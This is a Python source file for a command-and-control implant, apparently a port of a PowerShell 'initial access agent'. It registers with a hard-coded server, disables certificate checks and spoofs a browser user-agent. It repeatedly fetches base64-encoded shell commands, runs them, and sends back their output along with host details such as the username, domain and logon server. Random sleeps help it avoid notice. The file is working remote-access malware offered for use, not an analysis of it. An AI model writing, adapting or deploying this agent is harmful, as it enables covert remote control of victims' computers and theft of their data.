#
# Python port of powershell initial access agent
# will look to add cert verification eventually.
#
# xor-function 

import os
import wmi
import uuid
import time
import random
import base64
import datetime
import httplib2
import platform
import subprocess


uri = 'https://192.168.1.21/' # Set ip address or domain hosting the null-shell cgi app.
key = 'X0g4bGJoWmNTV2NEaWVvQk5NSWltTDR3N0VYTDJX' # set the key that matches the one set on the cgi handler inside single quotes
agent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"  # user-agent variable


def get_time_stamp():

	tstamp = str(datetime.datetime.now().time())
	return tstamp


def get_sysinfo():

	query = platform.system()

	if query == 'Linux':
		Opsys  = platform.uname()
		
	if query == 'Windows':
		OpSys  = platform.uname() 
		domain = os.environ['USERDOMAIN']
		userid = os.environ['USERNAME']
		LogOnServer = os.environ['LOGONSERVER']
		
	if query == 'Mac':
		OpSys  = platform.platform()
	
	machineName = platform.node()
	OpSys = platform.platform()
	UUID = uuid.getnode()
	updateTime = get_time_stamp()
	
	p = "|"
	telemetry = updateTime + p + domain + p + userid + p + LogOnServer + p + machineName + p + str(UUID) + p + OpSys
	return telemetry

	
def custom_b64_urlsafe_enc(b64str):

	rpequal = b64str.replace('=', '!')
	rpslash = rpequal.replace('/', '_')
	rpplus  = rpslash.replace('+', '-')
	cb64str = rpplus
	return cb64str

	
def custom_64_urlsafe_dec(cb64str):

	adequal = cb64str.replace('!', '=')
	adslash = adequal.replace('_', '/')
	adplus  = adslash.replace('-', '+')
	b64str = adplus
	return b64str

	
def b64encstr(str):

	b64str = base64.b64encode(str)
	return b64str


def b64decstr(encstr):

	decstr = base64.b64decode(encstr)
	return decstr

	
def web_request(url):

	h = httplib2.Http(".cache", disable_ssl_certificate_validation=True)
	resp, content = h.request(url, headers={'user-agent': agent })

	# code block for debuging
	#print "============================================================="
	#print url 
	#print "============================================================="
	#print resp
	
	return content


def exec_shell_cmd(cmmd):

	line = subprocess.Popen(cmmd,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
	out_bytes = line.stdout.read() + line.stderr.read()
	output_str = str(out_bytes)
	return output_str

	
def core():

	hostname = platform.node()
	OpSys	 = platform.system()
	UUID 	 = uuid.getnode()
	sys_id	 = hostname + '::' + OpSys + '::' + str(UUID)

	b64host  = b64encstr(sys_id)
	cb64host = custom_b64_urlsafe_enc(b64host)
	
	b64key  = b64encstr(key)
	cb64key = custom_b64_urlsafe_enc(b64key)
	
	enroll = uri + '?auth=' + cb64key + '&reg=' + cb64host
	bucket = web_request(enroll)
	
	while True:
	
		try:
			getcmd = uri + '?auth=' + cb64key + '&get=' + cb64host
			b64enccmd = web_request(getcmd)
			line = b64decstr(b64enccmd)
						
			if 'Time' in line:
			
				raw = exec_shell_cmd(line)
				raw_str = str(raw)
 				b64stdout = b64encstr(raw_str)
				b64chomped = b64stdout[:65000]
				cb64encstdout = custom_b64_urlsafe_enc(b64chomped)
				
				upload = uri + '?auth=' + cb64key + '&rsp=' + cb64encstdout + '&host=' + cb64host
				bucket = web_request(upload)
				time.sleep(random.randint(0,10))				
				
			else:

				raw = get_sysinfo()
				raw_str = str(raw)
 				b64stdout = b64encstr(raw_str)
				b64chomped = b64stdout[:65000]
				cb64encstdout = custom_b64_urlsafe_enc(b64chomped)
					
				update = uri + '?auth=' + cb64key + '&data=' + cb64encstdout + '&host=' + cb64host
				bucket = web_request(update)
				time.sleep(random.randint(15,45))
				
		except:

			#line = 'caught exception during command exec going to sleep'
			#print line
			time.sleep(random.randint(65,130))


while True:
	try:
		core()
	except:
		# print "caught exception executing core function, going to sleep..."
		time.sleep(random.randin(280,500))
